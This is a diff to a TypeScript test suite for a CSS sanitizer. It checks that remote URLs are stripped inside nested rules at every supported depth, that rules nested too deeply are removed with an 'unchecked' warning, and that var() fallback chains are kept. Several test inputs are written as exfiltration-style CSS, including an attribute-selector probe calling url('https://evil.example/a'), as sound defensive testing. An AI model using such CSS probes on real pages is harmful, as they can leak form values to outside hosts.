@@ -1,8 +1,20 @@
 import { describe, it, expect } from "vitest";
 
-import { sanitizeBlockCss, sanitizeCustomCss } from "./css-sanitize";
+import {
+  MAX_RULE_NESTING,
+  MAX_VALUE_NESTING,
+  sanitizeBlockCss,
+  sanitizeCustomCss,
+} from "./css-sanitize";
 
 const SCOPE = "nx-pb-page-abc";
+
+/** `.n1 { .n2 { … { body } } }`, nested exactly `depth` rules deep. */
+const nestRule = (depth: number, body: string): string => {
+  let css = body;
+  for (let i = depth; i >= 1; i -= 1) css = `.n${i} { ${css} }`;
+  return css;
+};
 
 /** The sanitized CSS alone; the warnings have their own suite below. */
 const clean = (css: string, scope: string): string =>
@@ -298,23 +310,66 @@ describe("custom CSS may not reach off this origin", () => {
     ).toEqual([]);
   });
 
-  it("reads inside a nested rule, at any depth", () => {
+  it("reads inside a nested rule, at every depth it follows", () => {
     // css-tree leaves a nested rule as a `Raw` child of its parent's block, so
     // a declaration-only walk never sees the URL inside it.
     for (const css of [
       `input[value^="a"] { .probe { background: url("https://evil.example/a") } }`,
       `.a { .b { .c { background: url("https://evil.example/a") } } }`,
+      nestRule(MAX_RULE_NESTING, `background: url("https://evil.example/a")`),
     ]) {
       const out = sanitizeCustomCss(css, SCOPE);
       expect(out.css).not.toContain("evil.example");
       expect(out.warnings.map(w => w.code)).toContain("remote-url");
     }
-    // And an ordinary nested rule survives untouched, at either depth.
-    for (const css of [
-      `.a { .nested { color: red } }`,
-      `.a { .b { .c { color: red } } }`,
-    ]) {
-      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
+    // And an ordinary nested rule survives untouched at any depth the scan
+    // follows. The shallow cases are what people write; the last is the edge of
+    // what the bound permits, which is where an off-by-one would show.
+    for (const depth of [1, 2, 3, 5, MAX_RULE_NESTING]) {
+      const out = sanitizeCustomCss(nestRule(depth, "color: red"), SCOPE);
+      expect(out.warnings).toEqual([]);
+      // Spacing is not normalised at every level: a nested rule is re-emitted
+      // from the text the parser left it as, while the outermost declaration
+      // goes through the generator. Both keep the declaration, which is the
+      // property under test.
+      expect(out.css.replace(/\s+/g, "")).toContain("color:red");
+      expect(out.css).toContain(`.n${depth}`);
+    }
+  });
+
+  it("refuses nesting past the bound as unchecked, not as a URL", () => {
+    // Rules deeper than the scan follows are still removed — unreadable is not
+    // safe — but the reason given has to be the real one. Reporting them as
+    // remote URLs sent authors looking for a host their CSS never named, and
+    // fired on valid stylesheets: the deepest CSS in this repository nests five
+    // levels, so a bound anywhere near that is hit by ordinary output.
+    const out = sanitizeCustomCss(
+      nestRule(MAX_RULE_NESTING + 1, "color: red"),
+      SCOPE
+    );
+    expect(out.warnings.map(w => w.code)).toEqual(["unchecked"]);
+    expect(out.warnings[0]?.message).toContain("levels deep");
+    // Removed all the same, so a URL hiding below the bound never lands.
+    const hidden = sanitizeCustomCss(
+      nestRule(
+        MAX_RULE_NESTING + 1,
+        `background: url("https://evil.example/a")`
+      ),
+      SCOPE
+    );
+    expect(hidden.css).not.toContain("evil.example");
+  });
+
+  it("follows a var() fallback chain as deep as real ones go", () => {
+    // A design-token stack walks `var()` through several tiers before it
+    // bottoms out in a literal. Refusing those as remote URLs deleted valid
+    // declarations and blamed a host that appears nowhere in them.
+    for (const depth of [1, 2, 3, 4, 6, MAX_VALUE_NESTING]) {
+      let inner = "red";
+      for (let i = depth; i >= 1; i -= 1) inner = `var(--v${i}, ${inner})`;
+      const out = sanitizeCustomCss(`.a { color: ${inner} }`, SCOPE);
+      expect(out.warnings).toEqual([]);
+      expect(out.css).toContain("red");
     }
   });
 
